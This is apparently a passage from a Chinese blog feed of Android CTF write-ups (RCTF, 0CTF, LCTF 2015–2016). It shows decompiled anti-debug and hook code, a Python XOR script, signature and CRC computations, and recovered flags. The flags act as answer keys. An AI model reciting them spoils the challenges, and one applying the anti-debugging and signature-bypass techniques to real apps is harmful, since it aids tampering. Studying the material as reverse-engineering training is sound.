&lt;p&gt;然而一直&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unable to open......&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;后来发现，权限没给。。。。。。&lt;/p&gt;

&lt;p&gt;然后就搞出来了&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;How do you extract an App’s data from a full backup made through “adb backup”?: http://android.stackexchange.com/questions/28481/how-do-you-extract-an-apps-data-from-a-full-backup-made-through-adb-backup&lt;/li&gt;
  &lt;li&gt;安卓hacking Part 15: 使用备份技术黑掉安卓应用: http://bobao.360.cn/learning/detail/169.html&lt;/li&gt;
  &lt;li&gt;使用SQLCipher对数据库加密: http://blog.csdn.net/small_lee/article/details/50971132&lt;/li&gt;
  &lt;li&gt;sqlcipher: https://github.com/sqlcipher/sqlcipher&lt;/li&gt;
  &lt;li&gt;利用SQLCipher加解密数据库（包括加解密已有的数据库）: http://blog.csdn.net/wjk343977868/article/details/53410738&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Tue, 21 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/21/2015-XCTF-RCTF-flag-system-100.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/21/2015-XCTF-RCTF-flag-system-100.html</guid>
            </item>
        
            <item>
                <title>2015 0CTF - simple-150</title>
                <description>&lt;p&gt;20150CTF的Mobile第二题，分值150&lt;/p&gt;

&lt;p&gt;Java层简单明了的写了从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;res/raw&lt;/code&gt;文件夹读取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;，然后输入数据进行对比&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CF9BEA7891066CE296C913F05AFF88BD.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;对着目录找到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/37DD0436907B11EE5B50D3A502B156E1.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Flag：0ctf{Too_Simple_Sometimes_Naive!!!}&lt;/p&gt;

&lt;p&gt;仿佛是在嘲笑我&lt;/p&gt;

&lt;p&gt;抱着&lt;strong&gt;打死不信出题人半个字&lt;/strong&gt;的原则，输入APP验证，然而&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wrong&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;发现有一个so文件&lt;/p&gt;

&lt;p&gt;IDA打开，发现有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.init_array&lt;/code&gt;段，调用了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my_init()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;__int64 my_init()
{
    int PID; // r0@3
    __int64 v1; // ST00_8@3

    j_j_set_logfunction(nullsub_2);
    if ( CheckSig() )
        j_j_exit(0);
    PID = j_j_getpid();
    j_j_hook(&amp;amp;unk_6004, PID, &quot;libc.&quot;, &quot;read&quot;, CheckStrace, CheckPtrace, 0);
    return v1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;看着这命名，目测是签名验证反调试，然后有一个hook操作&lt;/p&gt;

&lt;p&gt;回想在Java层输入的Flag不正确，再结合这里，应该就是有坑，这个坑目测就是hook了某个函数&lt;/p&gt;

&lt;p&gt;再从传入的参数来看，应该是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;于是就翻啊翻，找啊找，找到一个小朋友……&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7F76FF3387FAC9F2805148F12D5F22BA.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通常在自定义的函数里有异或操作往往说明这里是一个关键&lt;/p&gt;

&lt;p&gt;注意前面有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v5&lt;/code&gt;，其中的两个参数用在了后面的异或操作中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v3&lt;/code&gt;可能是某数组的起始地址，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v10&lt;/code&gt;可能是长度&lt;/p&gt;

&lt;p&gt;再进一步猜测，它是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read()&lt;/code&gt;想到这里，我们把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dest[]&lt;/code&gt;数组从so里拷贝出来&lt;/p&gt;

&lt;p&gt;这里有个小技巧，可以使用Winhex的拷贝功能，找到偏移后，右键用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C Source&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned AnsiChar data[35] = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x1D, 0x1B, 0x48, 0x2C, 0x0C, 0x24, 0x02, 0x02, 0x09, 0x3A, 0x0B, 
	0x3B, 0x0E, 0x03, 0x3A, 0x39, 0x0C, 0x08, 0x11, 0x00, 0x00, 0x1A, 0x09, 0x0C, 0x29, 0x20, 0x58, 
	0x44, 0x00, 0x00
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;写个简单的脚本异或一下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# coding = utf-8

data = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x1D, 0x1B, 0x48, 0x2C, 0x0C, 0x24, 0x02, 0x02, 0x09, 0x3A, 0x0B, 
    0x3B, 0x0E, 0x03, 0x3A, 0x39, 0x0C, 0x08, 0x11, 0x00, 0x00, 0x1A, 0x09, 0x0C, 0x29, 0x20, 0x58, 
    0x44, 0x00, 0x00]

old_flag = &quot;0ctf{Too_Simple_Sometimes_Naive!!!}&quot;

def main():
    flag = []
    for i in range(len(old_flag)):
        flag.append(chr(ord(old_flag[i]) ^ data[i]))
    print &quot;&quot;.join(flag)

if __name__ == '__main__':
    main()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0ctf{It's_More_Than_Meets_The_Eye!}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;到这里可以确定我们的猜测，so里hook了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read()&lt;/code&gt;函数，我们输入的字符串被异或后再和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;里的数据对比&lt;/p&gt;

&lt;p&gt;相比另一道150的Mobile，我觉得这题很值&lt;/p&gt;
</description>
                <pubDate>Mon, 20 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/20/2015-0CTF-simple-150.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/20/2015-0CTF-simple-150.html</guid>
            </item>
        
            <item>
                <title>2015 0CTF - vezel-100</title>
                <description>&lt;p&gt;20150CTF的Mobile第一题，分值100&lt;/p&gt;

&lt;p&gt;JEB打开一瞧，没有so，想想0CTF分数动不动好几百的比赛，100分的题目还上so那就太不道德了，关键三段代码如下，非常简单&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public void confirm(View v) {
    if(&quot;0CTF{&quot; + String.valueOf(this.getSig(this.getPackageName())) + this.getCrc() + &quot;}&quot;.equals(
            this.et.getText().toString())) {
        Toast.makeText(((Context)this), &quot;Yes!&quot;, 0).show();
    }
    else {
        Toast.makeText(((Context)this), &quot;0ops!&quot;, 0).show();
    }
}

private String getCrc() {
    String v1;
    try {
        v1 = String.valueOf(new ZipFile(this.getApplicationContext().getPackageCodePath()).getEntry(
                &quot;classes.dex&quot;).getCrc());
    }
    catch(Exception v0) {
        v0.printStackTrace();
    }

    return v1;
}

private int getSig(String packageName) {
    int v4;
    PackageManager v2 = this.getPackageManager();
    int v5 = 64;
    try {
        v4 = v2.getPackageInfo(packageName, v5).signatures[0].toCharsString().hashCode();
    }
    catch(Exception v0) {
        v0.printStackTrace();
    }

    return v4;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;首先是签名部分，有的同学会认为这里是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dex Header&lt;/code&gt;里的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHA1 Signature&lt;/code&gt;，不是的，这里计算出来是很长的一大串&lt;/p&gt;

&lt;p&gt;如果要算的话，我们写个APP去获取，代码如下（百度上临时找的）&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.wnagzihxain.myapplication;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    
    private StringBuilder builder;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        PackageManager manager = getPackageManager();
        builder = new StringBuilder();
        String pkgname = &quot;com.ctf.vezel&quot;;
        boolean isEmpty = TextUtils.isEmpty(pkgname);
        if (isEmpty) {
            Toast.makeText(this, &quot;应用程序的包名不能为空！&quot;, Toast.LENGTH_SHORT);
        } else {
            try {
                PackageInfo packageInfo = manager.getPackageInfo(pkgname, PackageManager.GET_SIGNATURES);
                Signature[] signatures = packageInfo.signatures;
                for (Signature signature : signatures) {
                    builder.append(signature.toCharsString());
                }
                String signature = builder.toString();
                Log.i(&quot;wnagzihxa1n&quot;, signature);
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;04-01 23:35:12.497 5939-5939/com.wnagzihxain.myapplication I/wnagzihxa1n: 308203473082022fa00302010202043920b637300d06092a864886f70d01010b05003054310b300906035504061302434e310b300906035504081302434e310b3009060355040713025348310d300b060355040a1304534a5455310d300b060355040b1304306f7073310d300b0603550403130430637466301e170d3135303330363035323930315a170d3430303232383035323930315a3054310b300906035504061302434e310b300906035504081302434e310b3009060355040713025348310d300b060355040a1304534a5455310d300b060355040b1304306f7073310d300b060355040313043063746630820122300d06092a864886f70d01010105000382010f003082010a0282010100dd03fbab4ce3ba02230cf7a6a756309c8a45ae25384fef3d4a293c1b298082aee969e689128bef54bd763bb5f1a20218d824ac934d86a97d4a17bff345e146bbe3d506246bb86766745da46d16bad78e692db746528dbbf365c15b8e529132631e2cc3970910fb58caa3d082ab419f61d9c80379b6b7b40b1458173871efcaf2e7f69ffc29521cbefc641461de8a799c88d359f0bed6c1fcda939c954fe117ae45888829b6a8ae12d566709b434f2f8ae0c13bd3fbd9a4492c1a09201521b8e8a299adc4b6e8a1adeb7a11a7aef4a9ae13806b11acc4da0d6c420450e073927f6d094e91b5a18e74beec3083f8ff95ce8fcb091a411db1e4d64a6733d4942c590203010001a321301f301d0603551d0e04160414c5f5c9198b5ccc546570fd243a268f50277d7e0d300d06092a864886f70d01010b05000382010100c77bcd399b74e42c2b97171a264492e8bbd47ba3871057d1bc902c5f207aa2609d80992d3702f3ed70f888faf0ea90421e57bf53ec7852af8c31e073788e7a0fc45f421d687a367361ae0643ee81acc8e47e2fda7b14cf633eb78bac43bd95c97519466c6f8c0e0f23a105b871958ae4c6e54997ea2034185a7eb46369657e4f4b1594ef8c9ead2fb74b85d60fcabe7764c57169c89b5d8da43103d619bb8002e9917751afe8572217f8e7f13f3f308659bd8bc8f95a23f351c62c617d9748e27789807022508daf4bfa1605b58986c4d67f254f3fd4dcad2d31059d304b304d6643e2d44a9265427b72d93e83b3fc4f5a803cb586764fa3e28863eaf29961c9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;算一下&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashCode()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-183971537
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;classes.dex&lt;/code&gt;的CRC32值&lt;/p&gt;

&lt;p&gt;这个在线算一下就行，连同MD5什么的一条龙服务&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MD5: 3217b0ad6c769233ea2a49d17885b5ba 
SHA1: ec3b4730654248a02b016d00c9ae2425379bf78f 
CRC32: 46E26557 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里需要转成十进制&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; print int(&quot;46E26557&quot;, 16)
1189242199
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;两部分算完合起来就是Flag&lt;/p&gt;

&lt;p&gt;Flag：0ctf{-1839715371189242199}&lt;/p&gt;

&lt;p&gt;这样搞有点麻烦，其实动态调试一下就出来了，int要改为string类型，然而我并不会改，一改就崩溃&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/ECD79F1A5D3281500311CF15A1420C88.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;JEB2有动态调试的功能，我用的有点残&lt;/p&gt;

&lt;p&gt;这里有个哥们写了篇使用JEB2调试APK的文章，这么详细的文章可惜百度搜半天搜不出来&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;jeb2.2.7动态调试apk: http://balis0ng.com/post/android/2016-11-27&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;挺简单一东西整的这么扎心&lt;/p&gt;
</description>
                <pubDate>Sun, 19 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/19/2015-0CTF-vezel-100.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/19/2015-0CTF-vezel-100.html</guid>
            </item>
        
            <item>
                <title>2016 LCTF - easyeasy-200</title>
                <description>&lt;p&gt;2016年LCTF的第二道Mobile题，分值200，有言在先，本百分之九十九靠着自己多年酱油选手的灵感&lt;/p&gt;

&lt;p&gt;Jadx载入样本，先判断了输入字符串的长度，然后对字符串进行处理，最后调用函数进行校验&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D7929F9A772913A9A5C7BC4323315E20.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Format类&lt;/code&gt;的函数进行处理，这里写了这么多个，肯定在后面会用到，不然出题人吃饱撑着写这么多&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B9BACA287C5607274E12EBC3646CC73F.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check()&lt;/code&gt;函数里显示检测了模拟器，所以直接运行在真机上，然后调用native函数进行校验&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B671016B48EC4E567CC9873AB788B104.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;IDA载入so，先看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkEmulator()&lt;/code&gt;函数，这个函数并没有做其它操作，只是根据传入的值返回&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/17E19CB1737E8290A924B2C36AEB298E.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;同时，我们看到还有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkPasswd()&lt;/code&gt;函数&lt;/p&gt;

&lt;p&gt;我们进行简单的分析，可以看出来中间用到了某种加密操作&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/BD021A61E412E73104873CFDF93410CB.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在对整个校验函数有了简单的认识后，进行深入分析&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sub_91C0(&amp;amp;v23, &amp;amp;unk_19D7F, &amp;amp;v22);
sub_7118(&amp;amp;v23, input_chars_new, num_33);
sub_8740(*v21 - 12);
sub_8740(v23 - 12);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在翻了几下之后，发现这几个函数并没有太大关系，我们需要关注的是&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;j_j_j__Z7encryptPKcj(v20, v22, *(v22 - 12));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;找到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v22 - 12&lt;/code&gt;的定义就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vInput_&lt;/code&gt;，v20在后面会有操作，所以应该是输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-00000028 vInput_         DCD ?
-00000024 var_24          DCB 4 dup(?)
-00000020 var_20          DCB ?
-0000001F                 DCB ? ; undefined
-0000001E                 DCB ? ; undefined
-0000001D                 DCB ? ; undefined
-0000001C var_1C 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟进去&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1C5C70F2313FAD8DE98F3FBEAF94B2D8.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这明显的Base64算法，那么分析到这里就可以回去了&lt;/p&gt;

&lt;p&gt;最后的对比&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;v14 = *v20;
v15 = sub_7B10(&amp;amp;secret, v14);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_7B10&lt;/code&gt;，可以跟进去&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int __fastcall sub_7B10(const void **a1, const char *a2)
{
    const void *v2; // r7@1
    const char *v3; // r6@1
    size_t v4; // r5@1
    size_t v5; // r4@1
    size_t v6; // r2@1
    int result; // r0@3

    v2 = *a1;
    v3 = a2;
    v4 = *(*a1 - 3);
    v5 = j_j_strlen(a2);
    v6 = v5;
    if ( v5 &amp;gt; v4 )
        v6 = v4;
    result = j_j_memcmp(v2, v3, v6);
    if ( !result )
        result = v4 - v5;
    return result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy()&lt;/code&gt;函数进行对比，那么现在关键的就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;使用交叉引用，找到一处对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt;的调用&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int sub_4C54()
{
    int result; // r0@1
    int v1; // [sp+0h] [bp-18h]@1
    char v2; // [sp+4h] [bp-14h]@1
    int v3; // [sp+8h] [bp-10h]@1

    v3 = _stack_chk_guard;
    My_create(&amp;amp;secret, &quot;dHR0dGlldmFodG5vZGllc3VhY2VibGxlaHNhdG5hd2k.&quot;, &amp;amp;v1);
    j_j___cxa_atexit(sub_6BE4, &amp;amp;secret, &amp;amp;unk_1E000);
    My_create(&amp;amp;dword_1E09C, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;, &amp;amp;v2);
    j_j___cxa_atexit(sub_6BE4, &amp;amp;dword_1E09C, &amp;amp;unk_1E000);
    result = _stack_chk_guard - v3;
    if ( _stack_chk_guard != v3 )
      j_j___stack_chk_fail();
    return result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从第二个字符串来看，这是Base64算法无误了&lt;/p&gt;

&lt;p&gt;那么分析到这，我们可以逆推一下，首先将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dHR0dGlldmFodG5vZGllc3VhY2VibGxlaHNhdG5hd2k.&lt;/code&gt;用Base64还原，然后倒序&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; temp = &quot;ttttievahtnodiesuacebllehsatnawi!&quot;
&amp;gt;&amp;gt;&amp;gt; temp[::-1]
'!iwantashellbecauseidonthaveitttt'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;鉴于没有参赛我也不知道Flag到底是什么&lt;/p&gt;

&lt;p&gt;网上流传的Flag：iwantashellbecauseidonthaveitttt&lt;/p&gt;

&lt;p&gt;可是我记得前面是有调用一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Format&lt;/code&gt;类的一个函数做&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substring()&lt;/code&gt;操作	，应该是补上固定长度的任意字符串&lt;/p&gt;

&lt;p&gt;不过还有一点点其它的东西可以跟大家聊一聊&lt;/p&gt;

&lt;p&gt;我们注意到&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; temp = &quot;iwantashellbecauseidonthaveitttt&quot;
&amp;gt;&amp;gt;&amp;gt; print len(temp)
32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而我们Java层传进来的字符串应该是33位，再来翻so文件，蓦然发现有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNI_OnLoad()&lt;/code&gt;函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/33D397BEE09213CCCC91EBD701047CD3.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;粗略一看，这里面的东西还是很多的，先是做初始化，猜测这里是要获取dex文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/69EA190E3646DA05E4BDF00AB796B149.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/maps&lt;/code&gt;找dex文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/620241D4E9DC523CE68E049B3668B82F.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;寻找dex的Magic Number&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EB8D6B6D08A540A574F04A6D7E5C1D5C.png&quot; alt=&quot;10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下来看到了比较关键的代码，这通常用于Dex文件自篡改，一大堆乱七八糟的东西没看懂是啥&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(v91)
{
    if(!j_j_mprotect(v75, v71, 7))
    {
        *v86 = *filenamed;
        v92 = *(filenamed + 3);
        if (v92)
        {
            v93 = filenamed + 16;
            v94 = v86 + 8;
            do
            {
                *v94 = *v93;
                ++v93;
                ++v94;
                --v92;
            }while(v92);
        }
        j_j_mprotect(v75, v71, 5);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这时候开始瞎猜，一定有篡改，而且截取的长度由33变成32，获取的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lcom/example/ring/wantashell/Format;&lt;/code&gt;类&lt;/p&gt;

&lt;p&gt;再回头看该类的四个函数，主办方还是很仁慈的，并没有换三个长度都是32的函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class Format {
    protected String form(String input) {
        return input.substring(5, 38);
    }

    protected String fo1m(String input) {
        return input.substring(5, 36);
    }

    protected String forn(String input) {
        return input.substring(5, 39);
    }

    protected String f0rm(String input) {
        return input.substring(5, 37);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大胆的猜测这里是将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;form()&lt;/code&gt;自篡改成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f0rm()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;那么现在Flag是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iwantashellbecauseidonthaveitttt&lt;/code&gt;就没什么问题了&lt;/p&gt;

&lt;p&gt;至于反调试，可以直接patch so的调用反调试函数指令，也可以动态调试的时候下断点，patch一下内存&lt;/p&gt;

&lt;p&gt;如果有同学感觉好的，在看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt;赋值那里，就应该猜到这是Base64算法，感觉再好一点的，直接就解出了Flag&lt;/p&gt;

&lt;p&gt;今天2017 Pwn2Own结束，数字获得了2017 Master of Pwn，膜拜各位大佬！！！！！！&lt;/p&gt;
</description>
                <pubDate>Sat, 18 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/18/2016-LCTF-easyeasy-200.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/18/2016-LCTF-easyeasy-200.html</guid>
            </item>
        
            <item>
                <title>2016 LCTF - easy-100</title>
                <description>&lt;p&gt;2016年LCTF的第一道Mobile题，分值100&lt;/p&gt;

&lt;p&gt;使用Jadx载入，用了混淆，没有so，也就是说纯Java层，到处翻一翻&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0DC18FAABEBD19FE26B1707E7C7E024F.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;找到最开始进行校验的地方，这里是一个Button的监听类&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/46A46CA03C37DF467E0473F06CEF520B.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;里面调用了AES加密&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/09BDE6C1205208E51BD2EB8E8051710F.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可能这样不是很容易理清校验顺序，我们使用JEB来分析，JEB有重命名变量的功能，非常好用&lt;/p&gt;

